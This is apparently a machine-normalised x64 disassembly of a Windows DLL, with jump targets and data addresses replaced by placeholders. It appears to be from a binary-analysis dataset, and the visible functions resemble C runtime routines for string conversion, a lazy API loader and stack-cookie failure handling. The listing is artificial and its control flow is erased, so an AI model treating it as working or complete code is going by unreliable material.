mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r12 + rbx * 8 ]
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
add [ rdi + 0x8 ] 0xffffffff
mov ebx 0x1
js r-xdata
mov rcx rdi
call sub_18001923c
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov esi eax
and esi 0x1f
imul rsi rsi 0x58
add rsi [ r12 + rbx * 8 ]
mov rcx rdi
call sub_18001d074
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
test [ r11 + 0x38 ] 0x7f
je r-xdata
mov rcx rdi
call sub_18001d074
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
add [ rdi + 0x8 ] 0xffffffff
mov [ rsp + 0x40 ] cl
js r-xdata
mov eax 0xffff
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
mov [ rsp + 0x48 ] cl
movzx ecx cl
call sub_180019670
test eax eax
je r-xdata
cmp ecx 0xffffffff
je r-xdata
mov rcx rdi
call sub_18001d074
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x40 ]
movsxd r8 ebx
call sub_180019620
cmp eax 0xffffffff
jne r-xdata
add [ rdi + 0x8 ] 0xffffffff
js r-xdata
mov [ rsp + 0x41 ] cl
cmp ecx 0xffffffff
je r-xdata
mov ax [ rsp + 0x40 ]
jmp r-xdata
call sub_180010834
mov [ rax ] 0x2a
jmp r-xdata
mov rcx rdi
call sub_18001d074
mov ecx eax
mov rax [ rdi ]
movzx ecx [ rax ]
inc rax
mov [ rdi ] rax
jmp r-xdata
mov [ rsp + 0x49 ] cl
mov ebx 0x2
movsx ecx [ rsp + 0x48 ]
mov rdx rdi
call sub_18001d004
jmp r-xdata
cmp ecx 0xffffffff
jne r-xdata
sub_18001acec
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rbp
push rsi
push rdi
push r12
push r13
push r15
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov r13d 0xffff
mov rdi rdx
movzx ebp cx
mov [ rsp + 0x24 ] cx
cmp cx r13w
je r-xdata
mov ax r13w
test [ rdx + 0x18 ] 0x1
mov esi 0x2
jne r-xdata
cmp [ rdx + 0x10 ] 0x0
jne r-xdata
test [ rdx + 0x18 ] 0x80
je r-xdata
test [ rdi + 0x18 ] 0x40
jne r-xdata
mov rcx rdx
call sub_180018f54
test [ rdx + 0x18 ] sil
jne r-xdata
mov rax [ rdi + 0x10 ]
add rax rsi
cmp [ rdi ] rax
jae r-xdata
mov rcx rdi
call sub_18001923c
lea r12 [ rw-data ]
lea r15 [ rw-data ]
cmp eax 0xffffffff
je r-xdata
add [ rdi ] 0xfffffffffffffffe
test [ rdi + 0x18 ] 0x40
mov rax [ rdi ]
je r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
mov r11 r12
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
mov [ rax ] bp
jmp r-xdata
cmp [ rax ] bp
je r-xdata
cmp [ rdi + 0x24 ] esi
jb r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_18001923c
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ r15 + rbx * 8 ]
jmp r-xdata
add [ rdi + 0x8 ] esi
and [ rdi + 0x18 ] 0xffffffef
or [ rdi + 0x18 ] 0x1
mov ax bp
jmp r-xdata
add rax rsi
mov [ rdi ] rax
mov [ rdi ] rax
test [ r12 + 0x38 ] 0x7f
je r-xdata
mov rcx rdi
call sub_18001923c
cmp eax 0xfffffffe
je r-xdata
test [ r11 + 0x8 ] 0x80
je r-xdata
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_180017570
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x40 ]
mov rbp [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
lea rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x20 ]
movzx r9d bp
mov r8d 0x5
call sub_18001a9dc
test eax eax
jne r-xdata
mov al [ rsp + 0x25 ]
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] esi
mov [ rsp + 0x29 ] al
jmp r-xdata
mov rcx rdi
call sub_18001923c
mov rcx rdi
movsxd rbx eax
sar rbx 0x5
call sub_18001923c
mov r12d eax
and r12d 0x1f
imul r12 r12 0x58
add r12 [ r15 + rbx * 8 ]
mov esi [ rsp + 0x20 ]
mov rax [ rdi + 0x10 ]
movsxd rdx esi
add rdx rax
cmp [ rdi ] rdx
jae r-xdata
lea eax [ rsi - 0x1 ]
movsxd rdx eax
test eax eax
js r-xdata
cmp [ rdi + 0x8 ] 0x0
jne r-xdata
dec [ rdi ]
mov al [ rsp + rdx + 0x28 ]
sub rdx 0x1
mov rcx [ rdi ]
mov [ rcx ] al
jns r-xdata
cmp esi [ rdi + 0x24 ]
jg r-xdata
mov esi [ rsp + 0x20 ]
mov [ rdi ] rdx
sub_18001aef0
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
xor r14d r14d
mov rdi r8
mov rsi rdx
mov r12 rcx
mov rbx r14
mov [ rsp + 0x40 ] r14d
cmp rcx r14
je r-xdata
cmp rdx r14
jne r-xdata
cmp r8 r14
jne r-xdata
lea rcx [ rsp + 0x48 ]
mov rdx r9
call sub_18000d428
cmp r12 r14
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r14
mov [ rax ] 0x16
call sub_180010764
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x48 ]
cmp [ rax + 0x14 ] r14d
jne r-xdata
mov r13 [ rsp + 0x48 ]
cmp [ r13 + 0x14 ] r14d
jne r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_180017570
add rsp 0x80
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
lea rcx [ rsp + 0x40 ]
or rbx 0xffffffffffffffff
mov r8 rsi
mov [ rsp + 0x38 ] rcx
mov ecx [ rax + 0x4 ]
mov [ rsp + 0x30 ] r14
mov r9d ebx
xor edx edx
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] r14
call [ WideCharToMultiByte@IAT ]
cdqe
cmp rax r14
je r-xdata
mov rcx rsi
call sub_1800135a8
jmp r-xdata
cmp [ r13 + 0x10c ] 0x1
jne r-xdata
cmp rdi r14
jbe r-xdata
call sub_180010834
mov [ rax ] 0x2a
cmp [ rsp + 0x40 ] r14d
jne r-xdata
cmp [ rsp + 0x60 ] r14b
je r-xdata
mov ecx [ r13 + 0x4 ]
lea rax [ rsp + 0x40 ]
or rbx 0xffffffffffffffff
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r14
mov r9d ebx
mov r8 rsi
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
cmp rbp r14
je r-xdata
cmp rdi r14
jbe r-xdata
cmp [ rsp + 0x60 ] r14b
je r-xdata
mov eax 0xff
cmp [ rsi ] ax
ja r-xdata
mov rax rbx
mov rax [ rsp + 0x58 ]
and [ rax + 0xc8 ] 0xfffffffd
dec rax
jmp r-xdata
mov rcx [ rsp + 0x58 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x40 ] r14d
jne r-xdata
cmp [ rsp + 0x40 ] r14d
jne r-xdata
mov ecx [ r13 + 0x4 ]
lea rax [ rsp + 0x40 ]
mov r9d edi
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r14
mov r8 rsi
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
cdqe
cmp rax r14
je r-xdata
mov rax rsi
mov rcx rdi
call sub_180010834
mov [ rax ] 0x2a
cmp [ rsp + 0x60 ] r14b
je r-xdata
mov al [ rsi ]
mov [ r12 + rbx ] al
movzx eax [ rsi ]
add rsi 0x2
cmp ax r14w
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea rax [ rbp - 0x1 ]
jmp r-xdata
cmp [ rsp + 0x40 ] r14d
jne r-xdata
cmp rcx r14
je r-xdata
add rax 0x2
sub rcx 0x1
jne r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
mov rax [ rsp + 0x58 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x60 ] r14b
je r-xdata
inc rbx
cmp rbx rdi
jb r-xdata
cmp rbp rdi
jae r-xdata
cmp [ r12 + rax - 0x1 ] r14b
jne r-xdata
cmp [ rax ] r14w
jne r-xdata
cmp [ rax ] r14w
je r-xdata
mov rcx [ rsp + 0x58 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
jmp r-xdata
cmp [ rsp + 0x60 ] r14b
je r-xdata
mov ecx [ r13 + 0x4 ]
lea rax [ rsp + 0x40 ]
mov r9d 0x1
mov [ rsp + 0x38 ] rax
mov eax [ r13 + 0x10c ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] eax
lea rax [ rsp + 0x68 ]
mov r8 rsi
xor edx edx
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp eax r14d
je r-xdata
dec rax
mov rdi rax
sub rdi rsi
sar rdi 0x1
inc rdi
mov rax rbp
jmp r-xdata
mov rax [ rsp + 0x58 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x40 ] r14d
jne r-xdata
cmp eax r14d
jl r-xdata
cmp eax 0x5
ja r-xdata
movsxd rdx eax
lea rax [ rdx + rbp ]
cmp rax rdi
ja r-xdata
cmp rdx r14
mov rcx r14
jle r-xdata
add rsi 0x2
jmp r-xdata
mov al [ rsp + rcx + 0x68 ]
mov [ r12 + rbp ] al
cmp al r14b
je r-xdata
cmp [ rsp + 0x60 ] r14b
je r-xdata
inc rcx
inc rbp
cmp rcx rdx
jl r-xdata
mov rcx [ rsp + 0x58 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001b26c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
xor r12d r12d
mov rax r9
mov rdi r8
mov rbx rdx
mov rsi rcx
test rdx rdx
je r-xdata
test r8 r8
je r-xdata
test r8 r8
je r-xdata
test rdx rdx
je r-xdata
call sub_180010834
mov ebx 0x16
test rcx rcx
je r-xdata
mov [ rdx ] r12b
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
mov r8 [ rsp + 0x60 ]
cmp r8 rdi
cmova r8 rdi
cmp r8 0x7fffffff
ja r-xdata
and [ rcx ] r12
mov r9 [ rsp + 0x68 ]
mov rdx rax
mov rcx rbx
call sub_18001aef0
cmp rax 0xffffffffffffffff
jne r-xdata
inc rax
test rbx rbx
je r-xdata
test rbx rbx
je r-xdata
test rsi rsi
je r-xdata
cmp rax rdi
jbe r-xdata
call sub_180010834
mov eax [ rax ]
jmp r-xdata
mov [ rbx ] r12b
mov eax r12d
mov [ rsi ] rax
mov [ rax + rbx - 0x1 ] 0x0
cmp [ rsp + 0x60 ] 0xffffffffffffffff
je r-xdata
mov rax rdi
mov r12d 0x50
mov [ rbx ] r12b
cmp rdi rax
ja r-xdata
call sub_180010834
mov ebx 0x22
jmp r-xdata
and [ rsp + 0x20 ] r12
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
jmp r-xdata
sub_18001b388
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
mov ebp r8d
mov r13 rdx
mov r14 rcx
call EncodePointer
xor ebx ebx
mov rdi rax
cmp [ rw-data ] rbx
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
call DecodePointer
test rax rax
je r-xdata
mov rcx rax
call DecodePointer
mov rcx [ rw-data ]
mov rsi rax
call DecodePointer
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call __imp_EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r13
mov rdx r14
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call EncodePointer
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call DecodePointer
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x88 ]
mov r9d 0xc
lea r8 [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x38 ] 0x1
jne r-xdata
sub_18001b57c
sub rsp 0x38
test ecx ecx
js r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x38
retn
mov eax [ rw-data ]
jmp r-xdata
sub_18001b5cc
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_18001b608
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov rsi rcx
mov rdi rdx
lea rcx [ rsp + 0x30 ]
mov rdx r8
call sub_18000d428
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
call sub_18001d1d0
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
mov ebx eax
inc rsi
call sub_18001d1d0
inc rdi
test ebx ebx
je r-xdata
mov rdx rdi
mov rcx rsi
call sub_18001b5cc
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
sub ebx eax
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001b6ec
sub rsp 0x38
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
call sub_18001b608
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
mov eax 0x7fffffff
jmp r-xdata
call sub_18001b5cc
jmp r-xdata
add rsp 0x38
retn
sub_18001b74c
mov r10 rcx
test r8 r8
je r-xdata
xor eax eax
retn
movzx r9d [ r10 ]
inc r10
lea eax [ r9 - 0x41 ]
cmp eax 0x19
ja r-xdata
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r9d 0x20
sub r8 0x1
je r-xdata
add ecx 0x20
sub r9d ecx
mov eax r9d
retn
test r9d r9d
je r-xdata
cmp r9d ecx
je r-xdata
sub_18001b794
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov rdi r8
mov rsi rdx
mov rbp rcx
test r8 r8
je r-xdata
xor eax eax
lea rcx [ rax - 0x28 ]
mov rdx r9
call sub_18000d428
test rbp rbp
jne r-xdata
test rsi rsi
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
cmp [ rsp + 0x48 ] 0x0
je r-xdata
cmp rdi 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
movzx ecx [ rbp ]
lea rdx [ rsp + 0x30 ]
call sub_18001d1d0
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
mov ebx eax
inc rbp
call sub_18001d1d0
inc rsi
sub rdi 0x1
je r-xdata
mov r8 rdi
mov rdx rsi
mov rcx rbp
call sub_18001b74c
cmp [ rsp + 0x48 ] 0x0
je r-xdata
sub ebx eax
cmp [ rsp + 0x48 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp ebx eax
je r-xdata
sub_18001b8a8
sub rsp 0x38
cmp [ rw-data ] 0x0
jne r-xdata
xor r9d r9d
call sub_18001b794
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
mov eax 0x7fffffff
jmp r-xdata
cmp r8 0x7fffffff
ja r-xdata
add rsp 0x38
retn
call sub_18001b74c
jmp r-xdata
sub_18001b904
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov esi r9d
mov r11 r8
mov r10 rdx
mov edi ecx
test rdx rdx
jne r-xdata
test r8 r8
je r-xdata
call sub_180010834
mov ebx 0x16
mov [ rdx ] 0x0
mov edx [ rsp + 0x60 ]
mov eax edx
neg eax
sbb rcx rcx
neg rcx
inc rcx
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
lea eax [ r9 - 0x2 ]
mov ebx 0x22
cmp eax ebx
ja r-xdata
call sub_180010834
mov ebx 0x22
jmp r-xdata
xor ecx ecx
mov r8 r10
test edx edx
je r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
jmp r-xdata
mov r9 r8
mov [ r10 ] 0x2d
lea r8 [ r10 + 0x1 ]
lea ecx [ rbx - 0x21 ]
neg edi
add dl 0x30
add dl 0x57
jmp r-xdata
cmp rcx r11
jb r-xdata
cmp rcx r11
jb r-xdata
mov [ r8 ] dl
inc rcx
inc r8
test eax eax
je r-xdata
mov [ r8 ] 0x0
dec r8
mov [ r10 ] 0x0
call sub_180010834
jmp r-xdata
xor edx edx
mov eax edi
div esi
mov edi eax
cmp edx 0x9
jbe r-xdata
mov al [ r9 ]
mov cl [ r8 ]
mov [ r8 ] al
mov [ r9 ] cl
inc r9
dec r8
cmp r9 r8
jb r-xdata
xor eax eax
sub_18001ba30
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov r11 [ rw-data ]
mov [ rsp + 0x58 ] r11
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_1800196b8
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_1800196b8
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_18001bb7c
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x28 ] rax
lea r8 [ rsp + 0x20 ]
mov r9d 0x6
mov edx 0x1004
mov [ rsp + 0x26 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea rcx [ rsp + 0x20 ]
call sub_18001b740
or eax 0xffffffff
jmp r-xdata
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_180017570
add rsp 0x38
retn
sub_18001bbd0
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
lea rbp [ rsp + 0x40 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x30 ] rax
mov r14 [ rbp + 0xb0 ]
mov r12d [ r9 ]
xor edi edi
mov rbx r8
mov rsi rdi
mov [ rbp ] edi
mov [ rbp + 0x10 ] r9
mov r13d edx
mov r15d ecx
mov [ rbp + 0x8 ] rbx
cmp ecx edx
je r-xdata
mov rax rsi
lea rdx [ rbp + 0x18 ]
call [ GetCPInfo@IAT ]
cmp eax edi
je r-xdata
mov r9d r12d
mov r8 rbx
mov edx 0x1
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
mov edi eax
test eax eax
jne r-xdata
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
test edi edi
jle r-xdata
xor eax eax
jmp r-xdata
lea rdx [ rbp + 0x18 ]
mov ecx r13d
call [ GetCPInfo@IAT ]
cmp eax edi
je r-xdata
xor ebx ebx
movsxd rcx edi
mov rax 0x7ffffffffffffff0
cmp rcx rax
ja r-xdata
mov rcx [ rbp + 0x30 ]
xor rcx rbp
call sub_180017570
lea rsp [ rbp + 0x48 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
movsxd r8 edi
xor edx edx
mov rcx rbx
add r8 r8
call sub_180016870
mov r8 [ rbp + 0x8 ]
mov r9d r12d
mov edx 0x1
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
xor r15d r15d
cmp eax r15d
je r-xdata
lea rcx [ rcx + rcx + 0x10 ]
cmp rcx 0x400
ja r-xdata
mov [ rbp ] 0x1
cmp r12d 0xffffffff
je r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
cmp r14 r15
je r-xdata
call sub_18000e0ac
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov rcx rbx
call sub_1800174b0
lea edi [ rax + 0x1 ]
jmp r-xdata
mov edi r12d
call sub_18000e06c
cmp [ rbp ] r15d
jne r-xdata
mov eax [ rbp + 0xb8 ]
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] eax
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x20 ] r14
call [ WideCharToMultiByte@IAT ]
cmp eax r15d
je r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_1800232c0
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
movsxd rdx edi
mov ecx 0x1
call sub_180011510
mov rsi rax
cmp rax r15
je r-xdata
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] r15
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp eax r15d
je r-xdata
mov rsi r14
jmp r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp eax r15d
jne r-xdata
add rbx 0x10
jmp r-xdata
cmp r12d 0xffffffff
je r-xdata
mov rcx rsi
call sub_18000e06c
mov rsi r15
jmp r-xdata
mov rcx [ rbp + 0x10 ]
mov [ rcx ] eax
sub_18001be58
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_18000d428
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_18001bee8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rdi
sub rsp 0x20
test ecx ecx
js r-xdata
call sub_180010834
mov [ rax ] 0x9
call sub_180010854
and [ rax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
movsxd rbx ecx
lea rbp [ rw-data ]
mov rdi rbx
and ebx 0x1f
sar rdi 0x5
imul rbx rbx 0x58
mov rax [ rbp + rdi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
cmp [ rax + rbx ] 0xffffffffffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov rax [ rbp + rdi * 8 ]
or [ rbx + rax ] 0xffffffffffffffff
xor eax eax
jmp r-xdata
test ecx ecx
je r-xdata
mov rbx [ rsp + 0x30 ]
